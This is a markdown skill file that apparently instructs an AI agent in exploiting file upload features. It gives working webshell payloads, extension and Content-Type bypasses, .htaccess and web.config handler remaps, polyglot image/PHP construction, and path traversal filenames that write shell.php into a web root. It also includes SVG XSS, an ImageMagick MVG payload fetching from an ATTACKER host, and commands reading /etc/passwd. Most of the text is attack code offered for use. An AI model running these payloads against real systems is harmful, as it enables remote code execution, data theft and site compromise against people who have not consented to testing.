---
name: file-upload-testing
description: "File upload exploitation — extension and content-type bypass, .htaccess/web.config upload for handler remap, polyglot files, SVG/ImageMagick XXE and RCE, race-condition upload, path traversal via filename, plus persistence verification. Use when testing avatar, document, or import upload, image processing pipelines, or any endpoint writing attacker-controlled files."
---

# File Upload Exploitation

## Crown Jewel Targets

- **PHP hosting panels** (cPanel, Plesk, custom CMS) -- .htaccess upload + extension remap = instant RCE (Critical)
- **Legacy IIS/ASP.NET apps** -- web.config upload, semicolon truncation (`shell.asp;.jpg`), NTFS ADS bypass
- **Image processing pipelines** (ImageMagick, GD, Pillow) -- SVG XXE, ImageTragick RCE, polyglot JPEG/PHP
- **Document import features** (CSV, XLSX, PDF) -- path traversal via filename, SSRF via embedded URLs
- **Avatar/profile photo uploads** -- often stored in publicly accessible directories, minimal validation
- **Cloud storage with direct upload** (S3 pre-signed URLs, Azure Blob) -- if Content-Type not enforced, upload HTML/SVG for stored XSS
- **CMS media managers** (WordPress, Drupal, Joomla) -- plugin upload = RCE, theme upload with embedded webshell

## Attack Surface Signals

- **URL patterns**: `/upload`, `/api/upload`, `/api/v1/files`, `/api/attachments`, `/profile/avatar`, `/settings/photo`, `/import`, `/media/upload`, `/documents`
- **Response signals**: `multipart/form-data` in request, `Content-Disposition` in response, direct file URL returned after upload
- **Headers**: `X-Upload-Content-Type`, `X-File-Name`, `Content-Range` (chunked upload)
- **Tech signals**: `ImageMagick` in error messages, `GD` library references, S3 bucket URLs in upload responses

## Detection — Find Upload Endpoints

```bash
# Common upload endpoints
/upload, /api/upload, /api/v1/files, /api/attachments
/profile/avatar, /settings/photo, /import, /api/import
/media/upload, /documents, /api/documents

# Check Content-Type acceptance
curl -X POST "https://target.com/upload" \
  -F "file=@test.txt;type=application/octet-stream" -v

# Check which extensions are accepted
for ext in php jsp aspx py rb html svg xml; do
  curl -s -o /dev/null -w "%{http_code} $ext" \
    -F "file=@test.$ext" "https://target.com/upload"
done
```

## Extension Bypass Techniques

### Double extensions
```
shell.php.jpg        # Apache may parse as PHP
shell.php.png        # depends on handler config
shell.asp;.jpg       # IIS semicolon truncation
shell.aspx:.jpg      # NTFS alternate data stream
```

### Case variation
```
shell.pHp    shell.PhP    shell.PHP
shell.AsP    shell.jSp    shell.PY
```

### Alternative executable extensions
```
# PHP
.php, .php2, .php3, .php4, .php5, .php7, .pht, .phtml, .phar, .phps, .pgif, .shtml

# ASP/IIS
.asp, .aspx, .asa, .cer, .ashx, .asmx, .cshtml, .vbhtml

# Java
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

# Other
.pl, .cgi, .py, .rb, .sh, .config, .cfm
```

### Null byte / special chars
```
shell.php%00.jpg       # Null byte truncation (legacy PHP)
shell.php\x00.jpg      # Binary null
shell.php%0a.jpg       # Newline
shell.php/.            # Dot after slash (Apache)
shell.php%20           # Trailing space (Windows)
shell.php...           # Multiple dots (Windows)
```

## Content-Type Bypass

```bash
# Whitelist bypass — change Content-Type header
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg"

# Magic bytes prepend
# Add JPEG magic bytes before PHP code
printf '\xFF\xD8\xFF\xE0' > polyglot.php.jpg
cat shell.php >> polyglot.php.jpg

# GIF89a polyglot
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php

# PNG polyglot
python3 -c "
import struct
# PNG header + IDAT chunk containing PHP
header = b'\x89PNG\r\n\x1a\n'
print(header)
" > polyglot.png
```

## Server-Specific Attacks

### Apache — .htaccess upload
```bash
# If you can upload .htaccess:
echo 'AddType application/x-httpd-php .l33t' > .htaccess
# Then upload shell.l33t → executed as PHP

# Content in .htaccess to enable PHP in directory
echo 'php_value auto_prepend_file /etc/passwd' > .htaccess
```

### IIS — web.config upload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config"/>
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

### Nginx — path confusion
```
# If uploaded to /uploads/shell.php.jpg
# Try: /uploads/shell.php.jpg/x.php
# Nginx may pass .php to PHP-FPM → executes PHP in the image file
```

## Image Processing Attacks

### ImageMagick (ImageTragick)
```bash
# SVG with XXE
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="text:/etc/passwd"/>
</svg>

# MVG payload
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://ATTACKER/x.php'
pop graphic-context
```

### Exif metadata injection

`exiftool` does **not** ship in this image. The polyglot does not actually need it:
the payload only has to sit in the file after a valid image header, so appending it
works just as well and uses nothing but the shell.

```bash
# With exiftool, if you installed it (apt-get install libimage-exiftool-perl):
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

# Without it — append after a real JPEG header; validators that only sniff the
# magic bytes still pass the file.
printf '<?php system($_GET["c"]); ?>' >> image.jpg

mv image.jpg image.php.jpg
```

### SVG XSS
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="10" y="20">XSS</text>
</svg>
```

## Race Condition Upload

```bash
# Upload file → server processes → deletes dangerous files
# Race: access file between upload and deletion

# Turbo Intruder / single-packet attack:
# 1. Upload shell.php (server will delete it quickly)
# 2. Simultaneously request GET /uploads/shell.php
# 3. Win the race → RCE before cleanup
```

## Path Traversal via Filename

```bash
# Filename manipulation to write outside upload dir
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"

# URL-encoded traversal
-F "file=@shell.php;filename=..%2f..%2fshell.php"

# Double encoding
-F "file=@shell.php;filename=..%252f..%252fshell.php"
```

## Polyglot Files

```bash
# JPEG + PHP polyglot
# Start with valid JPEG header, embed PHP in comment
exiftool -Comment='<?php echo shell_exec($_GET["c"]); ?>' clean.jpg
# Rename: clean.php.jpg or clean.phtml

# PDF + PHP polyglot
%PDF-1.4
<?php system($_GET["c"]); ?>

# ZIP + PHP (PHAR)
# Create valid ZIP that's also valid PHP
```

## Impact Requirements

| Scenario | Severity | Accept Rate |
|----------|----------|-------------|
| RCE via webshell | Critical | 95% |
| Stored XSS via SVG/HTML | High | 80% |
| Path traversal + overwrite | Critical | 90% |
| SSRF via ImageMagick | High | 75% |
| DoS via resource exhaustion | Low-Med | 30% |
| File overwrite (non-exec) | Medium | 50% |

## Triage Checklist

- [ ] Upload endpoint found and functional
- [ ] Extension/content-type validation bypass confirmed
- [ ] Uploaded file accessible via URL (or processed server-side)
- [ ] Execution confirmed (not just upload — must trigger payload)
- [ ] Impact demonstrated (RCE, XSS, SSRF, data overwrite)
- [ ] Not self-only (other users affected or server-side impact)

## PortSwigger Academy — Advanced Techniques

- **.htaccess extension remapping**: Upload `.htaccess` with `AddType application/x-httpd-php .l33t` to make arbitrary extensions execute as PHP. Then upload `shell.l33t` — Apache processes it as PHP. This bypasses extension blacklists entirely.
- **Race condition file upload**: When server validates→moves→deletes dangerous files asynchronously, use single-packet attack (HTTP/2) or last-byte sync (HTTP/1.1) to access the file in the window between upload and deletion. Send upload + request simultaneously.
- **Obfuscated extension bypass**: `exploit.p.phphp` — if server strips `.php` once, the remaining characters reassemble to `.php`. Also: `exploit.php.` (trailing dot, Windows), `exploit.php%20` (trailing space), `exploit%2Ephp` (URL-encoded dot in extension).
- **Polyglot JPEG/PHP via ExifTool**: Use `exiftool -Comment="<?php echo 'START '.file_get_contents('/etc/passwd').' END'; ?>" photo.jpg` to inject PHP into EXIF metadata, then rename to `.php` or use in combination with extension bypass. The file passes image validation (valid JPEG headers) but executes as PHP.
- **Content-Type vs extension mismatch**: Server validates Content-Type header (`image/jpeg`) but uses the filename extension for execution. Send `Content-Type: image/jpeg` with filename `shell.php` — passes MIME validation, executes as PHP.
- **PUT method file creation**: Some servers accept `PUT /uploads/shell.php` to create files directly, bypassing upload form validation entirely. Check `OPTIONS` for allowed methods.
- **Oversize file + truncation**: Upload files at the boundary of size limits — some parsers truncate filenames, allowing `shell.php<padding>.jpg` to become `shell.php` after truncation.

## Operator Notes (Battle-Tested)

1. **Upload must verify persistence (MEMORY.md rule)** -- server echoing your file in the response is NOT proof of write. You must independently access the uploaded file at a separate URL. `res.file1` in JSON response could be a transient processing artifact.
2. **Race condition upload needs Turbo Intruder** -- upload the shell + GET request simultaneously using single-packet attack (HTTP/2) or last-byte sync (HTTP/1.1). The window between upload and server-side deletion can be milliseconds.
3. **Always test Content-Type mismatch first** -- send `Content-Type: image/jpeg` with filename `shell.php`. Many backends validate MIME type from the header but execute based on extension. Simplest bypass, highest success rate.
4. **ExifTool for polyglot injection** -- `exiftool -Comment='<?php system($_GET["c"]); ?>' clean.jpg` creates a valid JPEG that also contains PHP code. Pass image validation AND execute as PHP. Keep the original ExifTool output as evidence.
5. **Check PUT method on upload directories** -- `OPTIONS /uploads/` may reveal `PUT` is allowed. Direct `PUT /uploads/shell.php` bypasses upload form validation entirely. Many forget to restrict HTTP methods on storage paths.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Upload leads to command execution | `command-injection-testing` |
| ImageMagick SSRF via SVG/MVG | `ssrf-testing` |
| Path traversal in filename | `lfi-path-traversal` |
| Race condition between upload and deletion | `race-condition-testing` |
| WAF blocks file extension | `waf-bypass` → `references/waf-generic-evasion.md` |
| SVG upload with XXE | `xxe-testing` |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/polyglot-file-upload-rce.md` — **polyglot file upload rce** — related_patterns:
